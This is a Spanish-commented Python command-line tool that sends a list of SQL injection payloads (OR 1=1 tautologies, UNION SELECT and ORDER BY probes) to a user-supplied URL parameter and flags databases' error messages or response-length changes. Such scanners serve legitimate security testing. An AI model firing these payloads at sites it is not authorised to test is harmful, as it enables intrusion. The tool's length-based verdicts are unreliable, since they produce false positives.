#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL Injection Tester - Probador de inyección SQL
Herramienta para detectar vulnerabilidades de inyección SQL
"""

import requests
import sys
import re
from urllib.parse import urljoin, urlparse

class Colors:
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	BLUE = '\033[94m'
	CYAN = '\033[96m'
	END = '\033[0m'
	BOLD = '\033[1m'

BANNER = """
⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⠟⢉⣕⡞⣼⣿⣿⣿⣿⣿⡟⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣳⡀⢻⣤⣴⣴⣶⣶⣶⣿⣿⣷⣤⣼⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣼⢧⣿⣦⠬⡜⣼⡝⣿⢹⣿⣿⡟⣁⡀⣴⣿⡟⣹⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣗⠾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⢰⣿⢀⣿⢀⠨⢳⣷⢴⣧⣸⣟⡟⠉⢁⡾⠋⣀⡴⢃⡠⣠⣿⣻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡝⠋⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⣾⣧⢸⣻⠀⢩⡏⠀⣸⣯⣿⡿⠒⣲⠟⠘⣩⠿⣠⠏⣴⣿⢯⣟⣹⣄⡿⣿⣿⣿⠏⣿⣿⣿⣿⣧⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠘⢸⡇⣰⣿⠏⣿⣀⡼⠧⢶⣶⣳⡞⢳⠞⣿⣣⠏⠀⢠⣞⣀⣸⣿⣿⠀⢻⣿⣿⣿⣿⣯⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡦⣿⣷⣿⢹⠀⣯⣞⣧⣔⣯⣿⣯⡾⢃⣾⠟⠁⢀⣴⡟⢀⣼⡟⣾⡿⣐⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣸⣿⣧⢹⣾⣴⣿⠋⡇⢸⣸⣿⣿⣿⣿⣿⣿⣿⣯⣶⠟⠋⢀⣴⣫⢏⣴⠟⣽⣿⡟⠀⠈⢹⣿⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⢳⠇⣿⣿⣿⣿⢹⡀⠃⢸⡜⣿⢹⣿⣷⣿⣿⡿⣷⠶⠚⠛⢛⡿⠋⣠⣾⣿⣿⣿⣤⣦⣀⢸⡟⣠⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⢠⡞⣸⢻⣿⣿⣿⣾⣗⠄⠘⡇⣿⠚⠻⠿⠯⠿⠅⠀⠠⢄⠍⢨⡙⠊⠑⣿⣿⣯⣿⡿⠻⣿⢡⠇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⣾⢣⡟⢸⠀⣿⣿⣷⣿⣦⠀⣷⣹⣣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠛⠿⠿⡿⣁⣼⣿⡟⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⢠⣇⣼⣿⣾⠀⣿⣿⣮⡛⢿⣧⣽⡿⣿⣷⡤⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠶⠆⣰⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⡼⣼⣿⡏⡟⣼⣿⣿⣿⡻⣿⠃⣸⡟⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⢰⢳⢻⡿⣠⡷⣿⣿⣿⣿⡏⢻⣴⠏⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⣼⣿⡛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⡞⡞⣼⣷⢻⡇⣸⣿⣿⣿⡿⡟⠅⣴⣿⡟⢤⣀⠀⠀⠀⠀⠈⢿⡟⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⢠⢻⢁⡿⠇⣸⠇⣿⣿⣿⣿⣇⣿⠞⣡⣿⣧⣤⣽⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⡞⣸⠃⢀⣿⢀⣿⣿⣿⣿⣿⢥⣾⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠒⠺⠷⣏⡀⣼⡿⢸⣿⣿⣿⣏⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣯⠀⠀⠀⠀⣀⠀⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠻⣿⣿
⠀⠀⠀⠀⠈⠙⠳⢿⣿⣿⡟⢉⣰⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⢿⣿⣿⣷⣤⠖⠛⠉⠉⠀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⠤⢄⣀⠀⣨⡿⠟⢋⣿⡿⢯⣶⣝⣛⣛⣿⠿⢿⣿⢥⣠⠼⠻⣿⣟⣿⣿⣿⢿⣿⣿⡋⢤⡀⠀⠻⣌⣉⣻⣦⣀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿
⠀⠀⠀⠀⠀⠀⢀⣼⡟⠛⣛⣿⡿⠀⠉⢛⣻⣿⠿⠋⠀⢸⢹⠀⠀⠀⠀⠘⣾⣦⠉⠛⠷⢿⣿⣻⣦⡌⠢⡀⠘⣧⣙⡛⣿⣗⡚⠉⠉⠉⡇⠀⠀⢀⣀⣀⣠⣴⣿⣿
⠀⠀⠀⢀⡤⡶⣿⠋⣽⠛⣿⡿⢁⣤⢶⡋⠉⠁⠀⠀⠀⢸⠾⠆⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠈⠙⠛⣿⣦⡙⣏⠁⠈⣯⣙⠛⢿⣆⠀⣼⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⢠⡟⢸⣷⣿⠉⡇⢀⣯⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠻⢿⣟⢧⡤⠶⠛⠋⠉⠻⣿⣽⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣴⣶⣿⣧⣿⢃⠏⠀⡇⣼⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⠤⣀⠀⠀⠀⢻⡝⢿⣾⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣟⢿⣯⣎⠤⠔⡇⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⢴⣿⣿⣆⢻⣿⣿⣿⣿⣿⣿⣿⣿
⠀⣿⣿⡄⢿⠦⠀⢠⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢄⡉⢿⣻⡄⢻⣿⣿⣿⣿⣿⣿⣿⣿
⠀⢸⣿⣿⣾⣇⠀⠋⡏⠀⠀⠀⠀⣀⡤⠴⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣭⣻⣎⠀⠹⣵⡟⠙⠛⢿⣿⣿⣿⣿
⣴⣿⣿⣿⣻⣿⣆⢰⠁⠀⠀⠀⠘⠁⣶⠿⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠋⠀⠀⢻⣠⣴⠀⣼⡟⠛⠛⠛
⣿⣟⠙⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠙⠻⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣾⣿⠁⠀⠀⠀
⡏⠁⠀⠘⢿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠃⠀⠀⠀⠀
⣄⠀⢀⡀⠈⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠃⠀⠀⠈⠻⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣷⣤⣀⠀⠀⠀
⣿⣷⣌⢿⣷⣍⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠃⠀⠀⠀⠀⠈⠊⣙⠷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡟⣎⣻⣼⣷⡆⠀
⣿⣿⣿⣷⣽⣿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠉⠛⠷⢶⣤⣄⠀⠀⠀⢀⣠⣼⣿⣿⣿⣿⣷⣿⣿⡿⠿⠃⠀
⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⡦⢶⣄⠀⠀⠀⠀⠀⠀⢀⣀⡤⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⢿⣿⣿⣿⠿⠟⠛⠉⠁⠀⠙⣄⠀⠀
⣸⣷⣿⣿⣿⢿⣿⣿⣿⣿⣿⡄⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀
⠿⠿⢿⣿⣿⣾⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳
⠀⠀⠀⠁⠚⠉⠛⠙⠛⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢹⡟⣿⣿⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠉⢹⣏⠀⠉⠓⠤⣄⣀⡠⠖⠋⢳⣀⣀⣀⣀⣀⣀⣾⣐⣈⣦⣀⣀⡤⠤⠖⠒⠒⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⢸⠇⠸⣿⡄⡇⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠷⠶⠾⡊⠦⣄⣀⡤⠖⠉⠀⣀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⢧⠟⠀⠀⠙⢧⡵⠀⢀⣀⠠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠢⣤⣤⡴⠛⠉⠙⡆⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠒⠚⠛⠛⠛⠛⠒⠒⠒⠒⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡨⠋⠀⢀⣴⡾⠃⢀⠇⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠀⣜⠁⢀⣼⠛⠛⠤⣰⣫⠖⠀⡄⢸⡦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡀⠀⠀⠀⠘⢄⢸⢑⡷⢿⡿⢶⣄⠀⢈⠳⡄⣴⡧⢸⡏⠉⠳⡖⠲⠤⠤⢤⣄⣀⣠⡤⠴⠚⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡠⠤⠖⣚⣿⠀⠀⢄⡀⠙⠲⣍⣠⠋⠐⣠⣾⣿⢧⣴⣣⠏⣰⡿⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠴⠒⠉⠁⠀⠀⠀⠀⠀⠈⢷⡀⠐⠭⣗⡀⡴⢁⢀⣼⣿⠂⠉⠢⣴⣁⡾⠋⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠑⠦⢄⣀⠀⠀⠀⠀⠀⢀⣠⡤⢒⠯⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠦⢄⡀⠙⠧⣴⡋⣠⠟⠒⣤⣠⢀⠝⣄⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠉⠉⠉⠉⠉⢉⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠦⣜⡽⠡⣤⣼⡯⣍⡉⢲⠊⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢇⡰⠟⠋⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀
⡀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀
⠃⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀
⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀
⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣆⣀⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⢀⡇⡀⠀⠀⡰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⣤⢞⡞⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡉⡏⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡍⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀
"""

SQL_PAYLOADS = [
	"' OR '1'='1",
	"' OR '1'='1' --",
	"' OR '1'='1' /*",
	"admin' --",
	"admin' #",
	"' OR 1=1--",
	"' OR 1=1#",
	"' UNION SELECT NULL--",
	"' UNION SELECT NULL#",
	"1' OR '1'='1",
	"1' OR '1'='1'--",
	"1' OR '1'='1'/*",
	"' OR 'x'='x",
	"' OR 'a'='a",
	"') OR ('1'='1",
	"1' AND '1'='1",
	"1' AND '1'='2",
	"' UNION SELECT 1,2,3--",
	"' UNION SELECT 1,2,3,4--",
	"1' ORDER BY 1--",
	"1' ORDER BY 2--",
	"1' ORDER BY 3--",
]

ERROR_PATTERNS = [
	r"SQL syntax.*MySQL",
	r"Warning.*\Wmysql_",
	r"MySQLSyntaxErrorException",
	r"valid MySQL result",
	r"PostgreSQL.*ERROR",
	r"Warning.*\Wpg_",
	r"valid PostgreSQL result",
	r"Npgsql\.NpgsqlException",
	r"SQLite.*error",
	r"SQLiteException",
	r"SQLite3::",
	r"Warning.*\Wsqlite_",
	r"Microsoft.*ODBC.*SQL Server",
	r"SQLServer JDBC Driver",
	r"ODBC SQL Server Driver",
	r"Warning.*\Wmssql_",
	r"Warning.*\Wsqlsrv_",
	r"Warning.*\Woci_",
	r"Warning.*\Wora_",
	r"Microsoft Access.*Driver",
	r"JET Database Engine",
	r"Access Database Engine",
	r"Syntax error.*in query",
	r"quoted string not properly terminated",
	r"mysql_fetch",
	r"ORA-[0-9]{5}",
	r"Microsoft OLE DB Provider",
]

def test_sql_injection(url, param, payload):
	"""Prueba un payload de SQL injection"""
	try:
		# GET request
		params = {param: payload}
		response = requests.get(url, params=params, timeout=10, allow_redirects=False)
		
		# Verificar errores SQL
		for pattern in ERROR_PATTERNS:
			if re.search(pattern, response.text, re.IGNORECASE):
				return True, "Error SQL detectado", response.text[:500]
		
		# Verificar diferencias en respuesta
		normal_params = {param: "test"}
		normal_response = requests.get(url, params=normal_params, timeout=10, allow_redirects=False)
		
		if len(response.text) != len(normal_response.text):
			return True, "Diferencia en respuesta detectada", response.text[:500]
		
		return False, "No vulnerable", ""
	
	except Exception as e:
		return False, f"Error: {e}", ""

def main():
	print(f"{Colors.BOLD}{Colors.CYAN}{BANNER}{Colors.END}")
	print(f"{Colors.BOLD}{Colors.CYAN}╔════════════════════════════════════════╗{Colors.END}")
	print(f"{Colors.BOLD}{Colors.CYAN}║   SQL Injection Tester - Probador      ║{Colors.END}")
	print(f"{Colors.BOLD}{Colors.CYAN}╚════════════════════════════════════════╝{Colors.END}\n")
	
	url = input(f"{Colors.BLUE}URL objetivo (ej: http://example.com/page.php): {Colors.END}").strip()
	if not url:
		print(f"{Colors.RED}[!] Debes ingresar una URL{Colors.END}")
		return
	
	param = input(f"{Colors.BLUE}Parámetro a probar (ej: id, user, etc.): {Colors.END}").strip()
	if not param:
		print(f"{Colors.RED}[!] Debes ingresar un parámetro{Colors.END}")
		return
	
	print(f"\n{Colors.BLUE}[*] Probando {len(SQL_PAYLOADS)} payloads...{Colors.END}\n")
	
	vulnerable = False
	for i, payload in enumerate(SQL_PAYLOADS, 1):
		print(f"{Colors.YELLOW}[{i}/{len(SQL_PAYLOADS)}] Probando: {payload[:30]}...{Colors.END}", end='\r')
		
		is_vuln, reason, response = test_sql_injection(url, param, payload)
		
		if is_vuln:
			vulnerable = True
			print(f"\n{Colors.RED}[!] VULNERABLE detectado!{Colors.END}")
			print(f"{Colors.RED}Payload: {payload}{Colors.END}")
			print(f"{Colors.RED}Razón: {reason}{Colors.END}")
			if response:
				print(f"{Colors.YELLOW}Respuesta: {response[:200]}...{Colors.END}\n")
			break
	
	if not vulnerable:
		print(f"\n{Colors.GREEN}[+] No se detectaron vulnerabilidades SQL{Colors.END}")
		print(f"{Colors.YELLOW}[*] Nota: Esto no garantiza que sea seguro{Colors.END}")
	
	print(f"\n{Colors.BLUE}[*] Prueba completada{Colors.END}")

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print(f"\n{Colors.YELLOW}[!] Interrumpido por el usuario{Colors.END}")
		sys.exit(0)
	except Exception as e:
		print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
		sys.exit(1)

